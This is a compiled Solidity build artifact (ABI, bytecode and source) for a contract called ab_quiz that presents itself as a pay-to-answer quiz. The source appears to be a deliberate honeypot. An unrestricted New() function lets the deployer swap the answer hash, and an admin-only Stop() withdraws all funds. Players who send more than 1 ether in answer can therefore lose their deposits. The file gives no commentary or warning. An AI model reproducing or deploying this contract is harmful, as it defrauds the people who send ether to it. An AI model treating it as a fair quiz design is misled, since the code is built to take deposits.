{
  "contractName": "ab_quiz",
  "abi": [
    {
      "constant": true,
      "inputs": [],
      "name": "question",
      "outputs": [
        {
          "name": "",
          "type": "string"
        }
      ],
      "payable": false,
      "stateMutability": "view",
      "type": "function"
    },
    {
      "inputs": [
        {
          "name": "admins",
          "type": "bytes32[]"
        }
      ],
      "payable": false,
      "stateMutability": "nonpayable",
      "type": "constructor"
    },
    {
      "payable": true,
      "stateMutability": "payable",
      "type": "fallback"
    },
    {
      "constant": false,
      "inputs": [
        {
          "name": "_response",
          "type": "string"
        }
      ],
      "name": "Try",
      "outputs": [],
      "payable": true,
      "stateMutability": "payable",
      "type": "function"
    },
    {
      "constant": false,
      "inputs": [
        {
          "name": "_question",
          "type": "string"
        },
        {
          "name": "_response",
          "type": "string"
        }
      ],
      "name": "Start",
      "outputs": [],
      "payable": true,
      "stateMutability": "payable",
      "type": "function"
    },
    {
      "constant": false,
      "inputs": [],
      "name": "Stop",
      "outputs": [],
      "payable": true,
      "stateMutability": "payable",
      "type": "function"
    },
    {
      "constant": false,
      "inputs": [
        {
          "name": "_question",
          "type": "string"
        },
        {
          "name": "_responseHash",
          "type": "bytes32"
        }
      ],
      "name": "New",
      "outputs": [],
      "payable": true,
      "stateMutability": "payable",
      "type": "function"
    }
  ],
  "bytecode": "0x608060405234801561001057600080fd5b506040516106e03803806106e08339810180604052810190808051820192919050505060008090505b815181101561009a57600160026000848481518110151561005657fe5b906020019060200201516000191660001916815260200190815260200160002060006101000a81548160ff0219169083151502179055508080600101915050610039565b5050610635806100ab6000396000f30060806040526004361061006d576000357c0100000000000000000000000000000000000000000000000000000000900463ffffffff1680633853682c1461006f5780633fad9ae01461009d578063bedf0f4a1461012d578063c76de3e914610137578063ed8df164146101d9575b005b61009b600480360381019080803590602001908201803590602001919091929391929390505050610243565b005b3480156100a957600080fd5b506100b2610321565b6040518080602001828103825283818151815260200191508051906020019080838360005b838110156100f25780820151818401526020810190506100d7565b50505050905090810190601f16801561011f5780820380516001836020036101000a031916815260200191505b509250505060405180910390f35b6101356103bf565b005b6101d7600480360381019080803590602001908201803590602001908080601f0160208091040260200160405190810160405280939291908181526020018383808284378201915050505050509192919290803590602001908201803590602001908080601f01602080910402602001604051908101604052809392919081815260200183838082843782019150505050505091929192905050506104a3565b005b610241600480360381019080803590602001908201803590602001908080601f0160208091040260200160405190810160405280939291908181526020018383808284378201915050505050509192919290803560001916906020019092919050505061053e565b005b3273ffffffffffffffffffffffffffffffffffffffff163373ffffffffffffffffffffffffffffffffffffffff1614151561027d57600080fd5b818160405180838380828437820191505092505050604051809103902060001916600154600019161480156102b95750670de0b6b3a764000034115b1561031d573373ffffffffffffffffffffffffffffffffffffffff166108fc3073ffffffffffffffffffffffffffffffffffffffff16319081150290604051600060405180830381858888f1935050505015801561031b573d6000803e3d6000fd5b505b5050565b60008054600181600116156101000203166002900480601f0160208091040260200160405190810160405280929190818152602001828054600181600116156101000203166002900480156103b75780601f1061038c576101008083540402835291602001916103b7565b820191906000526020600020905b81548152906001019060200180831161039a57829003601f168201915b505050505081565b6002600033604051808273ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff166c0100000000000000000000000002815260140191505060405180910390206000191660001916815260200190815260200160002060009054906101000a900460ff16151561044357600080fd5b3373ffffffffffffffffffffffffffffffffffffffff166108fc3073ffffffffffffffffffffffffffffffffffffffff16319081150290604051600060405180830381858888f193505050501580156104a0573d6000803e3d6000fd5b50565b600060010260015460001916141561053a57806040518082805190602001908083835b6020831015156104eb57805182526020820191506020810190506020830392506104c6565b6001836020036101000a0380198251168184511680821785525050505050509050019150506040518091039020600181600019169055508160009080519060200190610538929190610564565b505b5050565b8160009080519060200190610554929190610564565b5080600181600019169055505050565b828054600181600116156101000203166002900490600052602060002090601f016020900481019282601f106105a557805160ff19168380011785556105d3565b828001600101855582156105d3579182015b828111156105d25782518255916020019190600101906105b7565b5b5090506105e091906105e4565b5090565b61060691905b808211156106025760008160009055506001016105ea565b5090565b905600a165627a7a723058208fe18ae3297cc86c671663fc3003cab5308bc716638e144e54f98a51ccbbf3cb0029",
  "source": "pragma solidity ^0.4.25;\r\ncontract ab_quiz\r\n{\r\n    function Try(string _response) external payable \r\n    {\r\n        require(msg.sender == tx.origin);\r\n\r\n        if(responseHash == keccak256(_response) && msg.value > 1 ether)\r\n        {\r\n            msg.sender.transfer(this.balance);\r\n        }\r\n    }\r\n    string public question;\r\n    bytes32 responseHash;\r\n    mapping (bytes32=>bool) admin;\r\n\r\n    function Start(string _question, string _response) public payable {\r\n        if(responseHash==0x0){\r\n            responseHash = keccak256(_response);\r\n            question = _question;\r\n        }\r\n    }\r\n    function Stop() public payable isAdmin {\r\n        msg.sender.transfer(this.balance);\r\n    }\r\n\r\n    function New(string _question, bytes32 _responseHash) public payable  {\r\n        question = _question;\r\n        responseHash = _responseHash;\r\n    }\r\n\r\n    constructor(bytes32[] admins) public{\r\n        for(uint256 i=0; i< admins.length; i++){\r\n            admin[admins[i]] = true;        \r\n        }       \r\n    }\r\n    modifier isAdmin(){\r\n        require(admin[keccak256(msg.sender)]);\r\n        _;\r\n    }\r\n\r\n    function() public payable{}\r\n}",
  "sourcePath": "D:/my repos/ab_quiz/contracts/quiz.sol",
  "compiler": {
    "name": "solc",
    "version": "0.4.25+commit.59dbf8f1.Emscripten.clang"
  },
  "schemaVersion": "3.4.1",
  "updatedAt": "2021-10-14T09:58:45.061Z",
  "networkType": "ethereum",
  "devdoc": {
    "methods": {}
  },
  "userdoc": {
    "methods": {}
  }
}